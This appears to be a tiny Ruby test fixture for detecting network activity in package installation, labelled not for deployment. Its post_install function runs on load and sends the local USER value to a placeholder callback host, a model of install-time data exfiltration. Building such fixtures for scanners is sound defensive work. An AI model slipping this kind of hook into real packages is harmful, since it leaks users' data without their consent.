# RUBY-GEM-NET-001 reachable package lifecycle network fixture. DO NOT DEPLOY.
require "net/http"
require "uri"

def post_install
  user = ENV.fetch("USER", "unknown")
  Net::HTTP.get(URI("https://gem-callback.example.invalid/install?user=#{user}"))
end

post_install
